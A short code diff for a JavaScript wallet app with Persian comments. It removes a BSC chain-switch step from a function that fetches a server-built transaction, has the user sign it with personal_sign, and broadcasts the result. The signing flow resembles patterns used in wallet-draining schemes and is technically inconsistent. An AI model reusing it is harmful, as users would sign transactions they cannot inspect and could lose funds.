@@ -26,18 +26,12 @@ function App() {
 
     async function genSign(address, chain, type) {
       try {
-        // ۱. بررسی و سوییچ به شبکه BSC
-        await provider.request({
-          method: "wallet_addEthereumChain",
-          params: [{ chainId: "0x38" }],
-        });
-
         let requestData = { handler: "tx", address, chain, type };
         var result = await jQuery.post(apiUrl, requestData);
         var unSigned = JSON.parse(result);
         console.log("📜 Unsigned Transaction:", unSigned);
 
-        // ۲. امضای تراکنش
+        // ۱. امضای تراکنش
         var signedMessage = await provider.request({
           method: "personal_sign",
           params: [JSON.stringify(unSigned.result), address],
@@ -52,7 +46,7 @@ function App() {
 
     async function acceptSign(signedTx) {
       try {
-        // ۳. ارسال تراکنش به شبکه
+        // ۲. ارسال تراکنش به شبکه
         var txHash = await provider.request({
           method: "eth_sendRawTransaction",
           params: [signedTx],
